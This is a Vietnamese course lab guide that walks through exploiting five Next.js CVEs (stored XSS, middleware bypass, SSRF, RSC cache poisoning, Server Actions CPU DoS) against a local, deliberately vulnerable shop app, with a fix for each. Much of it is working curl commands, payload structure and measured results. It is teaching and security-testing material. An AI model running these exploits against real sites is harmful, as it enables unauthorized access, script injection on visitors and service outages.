# MiniShop — hướng dẫn tấn công 5 CVE (lab local)

Tài liệu này là **hướng dẫn khai thác từng bước** cho 5 CVE của Next.js trên MiniShop, dùng cho môn học bảo mật. Mỗi mục gồm: điều kiện, cách tấn công thủ công, script tự động, bằng chứng cần chụp, và cách vá.

> **Phạm vi cho phép:** chỉ chạy trên máy cá nhân với `LOCAL_CVE_MODE=1`, frontend `build:study`/`start:study`. Không chạy bất kỳ lệnh nào trong tài liệu này lên Render, host public, mạng trường học dùng chung hoặc hệ thống không do bạn sở hữu. Đây là lab tự gây lỗi trên code của chính bạn.

## 0. Chuẩn bị môi trường

```bash
# MongoDB local
docker run -d --name minishop-mongo-lab -p 127.0.0.1:27017:27017 mongo:7.0

# Terminal 1 — backend
cd backend
npm ci && npm run build
MONGODB_URI='mongodb://127.0.0.1:27017/minishop' npm run seed:lab
MONGODB_URI='mongodb://127.0.0.1:27017/minishop' PORT=4000 npm run dev:study

# Terminal 2 — frontend
cd frontend
npm ci && npm run build:study
API_BASE_URL='http://localhost:4000' npm run start:study
```

- FE: `http://127.0.0.1:3000` (proxy) → Next ở `127.0.0.1:3001`
- BE: `http://127.0.0.1:4000`
- Admin: `admin@minishop.demo` / `MiniShop-Admin-2026!` (lấy từ `backend/.env`)

Kiểm tra nhanh trước khi tấn công:

```bash
curl -s http://127.0.0.1:3000/api/health
curl -s http://127.0.0.1:4000/api/health
```

## 1. CVE-2026-44580 — Stored XSS qua script `beforeInteractive`

**Mô hình tấn công:** kẻ tấn công kiểm soát được nội dung snippet marketing (tài khoản agency bị chiếm, import script từ bên thứ ba, hoặc admin độc hại). Nội dung chứa `</script>` phá thẻ khi Next serialize `self.__next_s`. Script chạy với origin của MiniShop, cho mọi khách truy cập trang chủ.

**Điều kiện:** snippet placement `beforeInteractive`, Next `<15.5.16`.

### Tấn công thủ công

```bash
API=http://127.0.0.1:4000
FE=http://127.0.0.1:3000

# 1) Đăng nhập admin, lấy token
TOKEN=$(curl -s -X POST "$API/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@minishop.demo","password":"MiniShop-Admin-2026!"}' \
  | node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>console.log(JSON.parse(d).token))')

# 2) Tìm snippet lab đã seed (đang tắt)
curl -s "$API/api/marketing/snippets" -H "Authorization: Bearer $TOKEN" \
  | node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>{for(const s of JSON.parse(d).snippets)console.log(s.id,s.enabled,s.name)})'

# 3) Bật snippet "CVE-2026-44580 demo"  (thay <SID> bằng id ở bước 2)
curl -s -X PATCH "$API/api/marketing/snippets/<SID>" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"enabled":true}'

# 4) Tải trang chủ và tìm payload phá thẻ
curl -s "$FE/" -o /tmp/xss44580.html
grep -o -E '.{40}</script><script>document\.documentElement\.dataset\.cve44580.{40}' /tmp/xss44580.html
```

Bằng chứng: chuỗi `</script><script>...` nằm **nguyên văn** trong `self.__next_s`. Mở `http://127.0.0.1:3000/` bằng browser → `alert('CVE-2026-44580: ...')`.

### Script tự động

```bash
node lab/44580-xss.mjs            # bật snippet + kiểm tra HTML
node lab/44580-xss.mjs --disable  # tắt lại
```

Script đăng nhập admin, tìm snippet, PATCH `enabled`, rồi tải trang chủ và in trích đoạn HTML quanh payload.

### Vá
Nâng Next `>=15.5.16` (escape nội dung script), hoặc không đưa dữ liệu không tin cậy vào `beforeInteractive`; nếu buộc dùng, chỉ cho phép ID/URL script thay vì nội dung thô.

## 2. CVE-2026-44575 — Bypass middleware bằng transport variant

**Mô hình tấn công:** route admin chỉ được bảo vệ bởi middleware. Middleware matcher loại trừ path chứa dấu chấm, nên request biến thể `.rsc`/`index.rsc` không đi qua middleware. Kẻ chưa đăng nhập vẫn render được trang admin.

**Điều kiện:** Next 15.2.0–15.5.15; matcher kiểu `'/((?!api|_next|favicon.ico|.*\\..*).*)'`; layout/page không kiểm tra quyền lần hai (trong MiniShop, chỉ ở `LOCAL_CVE_MODE=1`).

### Tấn công thủ công

```bash
FE=http://127.0.0.1:3000

# 1) Request bình thường bị chặn
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "$FE/admin/orders"
# -> 307 .../login?next=%2Fadmin%2Forders

# 2) Biến thể .rsc lọt matcher
curl -s -H 'RSC: 1' "$FE/admin/orders/index.rsc" -o /tmp/44575.rsc
echo "HTTP: $(curl -s -o /dev/null -w '%{http_code}' -H 'RSC: 1' "$FE/admin/orders/index.rsc")"
grep -o 'ADMIN_ROUTE_REACHED_WITHOUT_SESSION' /tmp/44575.rsc
```

Kết quả mong đợi: request 2 trả **200** và có marker `ADMIN_ROUTE_REACHED_WITHOUT_SESSION`.

Các biến thể khác đáng thử:

```bash
for p in /admin/orders/foo.rsc /admin/products/.rsc /admin/orders/index.RSC; do
  printf '%-32s -> ' "$p"
  curl -s -o /tmp/x.rsc -w '%{http_code} ' -H 'RSC: 1' "$FE$p"
  grep -q 'ADMIN_ROUTE_REACHED_WITHOUT_SESSION' /tmp/x.rsc && echo '[ADMIN]' || echo
done
```

### Script tự động

```bash
bash lab/44575-bypass.sh
```

### Giới hạn cần ghi trong báo cáo
Route admin **render không cần phiên** (đã vượt kiểm soát truy cập). Dữ liệu đơn hàng vẫn cần token vì page gọi API admin. Đây là giới hạn fixture của MiniShop: muốn chứng minh đọc dữ liệu, cần thêm một endpoint/page admin trả dữ liệu tĩnh không kiểm tra quyền trong lab.

### Vá
Nâng Next `>=15.5.16`, hoặc sửa matcher bao phủ transport variant; luôn kiểm tra quyền trong page/layout/API thay vì tin middleware duy nhất.

## 3. CVE-2026-64645 — SSRF qua `rewrites()` với hostname từ query

**Mô hình tấn công:** rewrite lấy `?host=` từ request làm hostname đích. Next server thực hiện fetch hộ, nên kẻ tấn công dùng server MiniShop làm proxy ra ngoài (hoặc vào mạng nội bộ nếu scheme/host phù hợp).

**Điều kiện:** rewrite (chỉ bật ở `LOCAL_CVE_MODE=1`):

```js
source: '/supplier-assets/:path*',
has: [{ type: 'query', key: 'host', value: '(?<supplierhost>.+)' }],
destination: 'https://:supplierhost/:path*',
```

Capture group **phải viết thường** (`supplierhost`), vì Next lowercase hostname.

### Tấn công thủ công

```bash
FE=http://127.0.0.1:3000

# Không có host -> không khớp rewrite
curl -s -o /dev/null -w 'no host: %{http_code}\n' "$FE/supplier-assets/robots.txt"

# Host do request chọn -> server fetch hộ
curl -s -D /tmp/64645.headers -o /tmp/64645.body \
  -w 'with host: %{http_code} %{size_download} bytes %{content_type}\n' \
  "$FE/supplier-assets/robots.txt?host=www.iana.org"
head -c 300 /tmp/64645.body
```

Kết quả mong đợi: `200` và nội dung `User-agent: * / Disallow:` lấy từ iana.org.

### Script tự động

```bash
bash lab/64645-ssrf.sh www.iana.org
```

### Giới hạn
Rewrite dùng scheme `https` cố định, nên chưa đọc được service HTTP nội bộ. Muốn chứng minh đọc dữ liệu nội bộ, dựng một HTTPS server local và trỏ `host=127.0.0.1:<port>`; hoặc sửa fixture thành scheme do request chọn (chỉ trong lab).

### Vá
Không ghép hostname từ input; whitelist host; nếu cần subdomain động, giới hạn `[a-z0-9-]+` và chặn IP/loopback/link-local. Nâng Next `>=15.5.21`.

## 4. CVE-2026-44576 — Cache poisoning RSC

**Mô hình tấn công:** shared cache của proxy key theo path+query, không tách HTML và RSC, không tôn trọng `Vary`. Kẻ tấn công prime URL bằng request RSC; nạn nhân request cùng URL nhận RSC payload thay vì HTML (trang hỏng, có thể kèm nội dung do kẻ tấn công kiểm soát).

**Điều kiện:** `frontend/study-proxy.js` chạy trước Next; cache dùng chung; Next `<15.5.16`.

### Tấn công thủ công

```bash
FE=http://127.0.0.1:3000
Q="?attack=$(date +%s)"

# 1) Prime cache bằng RSC
curl -s -H 'RSC: 1' -o /tmp/prime.rsc \
  -w 'prime: %{http_code} %{content_type} %{size_download}\n' "$FE/products$Q"

# 2) Nạn nhân tải HTML cùng URL
curl -s -o /tmp/victim.html \
  -w 'victim: %{http_code} %{content_type} %{size_download}\n' "$FE/products$Q"
grep -qi '<!DOCTYPE html' /tmp/victim.html && echo 'vẫn là HTML' || echo 'BỊ ĐẦU ĐỘC: nhận RSC'
```

Kết quả mong đợi: request nạn nhân trả `content-type: text/x-component`, body bắt đầu bằng `1:"$Sreact.fragment"`.

### Script tự động

```bash
bash lab/44576-cache.sh
```

Script tự thêm cache-buster nên mỗi lần chạy là một URL mới.

### Vá
Cache key phải gồm `RSC`/`Next-Router-*` hoặc tôn trọng `Vary`; nâng Next `>=15.5.16`. Trong production, MiniShop không dùng `study-proxy.js`.

## 5. CVE-2026-64641 — CPU DoS qua Server Actions

**Mô hình tấn công:** Next 15.5.15 kiểm tra MPA form action bằng cách gọi `FormData.getAll()` cho **mỗi** field `$ACTION_REF_*`; mỗi lần quét toàn bộ multipart body → O(n²). Một request nhiều field giữ CPU/event loop, các request khác bị block.

**Điều kiện:** App Router có Server Action; Next 13–15.5.20; `bodySizeLimit` đủ lớn (lab đặt 10 MB). Request phải chứa field `$ACTION_REF_<i>` và descriptor `$ACTION_<i>:0` với **action ID 42 ký tự hợp lệ** lấy từ manifest.

### Tấn công thủ công (không dùng script)

```bash
# 1) Lấy action ID hợp lệ từ build study
node -e 'const m=require("./frontend/.next/server/server-reference-manifest.json");console.log(Object.keys(m.node).find(k=>k.length===42))'

# 2) Gửi payload. Script lab làm việc này; lệnh dưới chỉ để hiểu cấu trúc:
#    - n field  $ACTION_REF_0..n-1
#    - n field  $ACTION_0:0..n-1:0  =  {"id":"<actionId>"}
#    - POST multipart/form-data tới /login
```

Cấu trúc field rút gọn (Node):

```js
const fd = new FormData();
for (let i = 0; i < n; i++) fd.append(`$ACTION_REF_${i}`, '');
for (let i = 0; i < n; i++) fd.append(`$ACTION_${i}:0`, JSON.stringify({ id: actionId }));
fd.append('email', 'lab@example.com');
fd.append('password', 'x');
await fetch('http://127.0.0.1:3000/login', { method: 'POST', body: fd });
```

### Script tự động

```bash
node lab/64641-dos.mjs 1000          # đo mốc nhỏ
node lab/64641-dos.mjs 4000 --yes
node lab/64641-dos.mjs 8000 --yes
node lab/64641-dos.mjs 16000 --yes
node lab/64641-dos.mjs 20000 --yes   # mốc nặng nhất đã thử
```

Đo tác động lên request khác (chạy song song):

```bash
( node lab/64641-dos.mjs 20000 --yes > /tmp/dos.log 2>&1 ) &
sleep 1
curl -s -o /dev/null -w 'health trong lúc DoS: %{time_total}s\n' http://127.0.0.1:3000/api/health
wait
grep 'Kết quả' /tmp/dos.log
curl -s -o /dev/null -w 'health sau DoS: %{time_total}s\n' http://127.0.0.1:3000/api/health
```

Kết quả đã đo: 1k→193ms, 4k→704ms, 8k→1638ms, 16k→5845ms, 20k→9037ms; `/api/health` bị block **8.035s** (bình thường 0.0035s).

### Cảnh báo khi chạy
- Chỉ local; không chạy lặp song song hoặc n > 20.000.
- Nếu máy chậm, dừng tiến trình Next và chạy lại.
- Action ID đổi sau mỗi lần build; script tự đọc manifest nên luôn dùng ID hiện tại.

### Vá
Nâng Next `>=15.5.21` (giới hạn tối đa 2 field `$ACTION_REF_*`), hoặc giới hạn kích thước/số field ở reverse proxy.

## Bảng tổng hợp script

| CVE | Lệnh | File |
|---|---|---|
| 44580 | `node lab/44580-xss.mjs` | `lab/44580-xss.mjs` |
| 44575 | `bash lab/44575-bypass.sh` | `lab/44575-bypass.sh` |
| 64645 | `bash lab/64645-ssrf.sh [host]` | `lab/64645-ssrf.sh` |
| 44576 | `bash lab/44576-cache.sh` | `lab/44576-cache.sh` |
| 64641 | `node lab/64641-dos.mjs [n] [--yes]` | `lab/64641-dos.mjs` |

## Checklist bằng chứng để nộp

1. **44580:** ảnh/đoạn HTML chứa `</script><script>` trong `self.__next_s` + ảnh browser alert.
2. **44575:** output `307` cho `/admin/orders` và `200` + marker cho `/admin/orders/index.rsc`.
3. **64645:** output `200` + nội dung lấy từ host ngoài, kèm URL `?host=`.
4. **44576:** hai dòng content-type: `text/x-component` cho cả prime và victim.
5. **64641:** bảng thời gian tăng phi tuyến + thời gian `/api/health` bị block.

## Dọn dẹp

```bash
node lab/44580-xss.mjs --disable
# Ctrl+C hai terminal backend/frontend
docker stop minishop-mongo-lab && docker rm minishop-mongo-lab
```

Xem thêm `docs/lab-cve-reproduction.md` (kết quả đã chạy) và `frontend/CVE-STUDY.md` (điều kiện trong source).
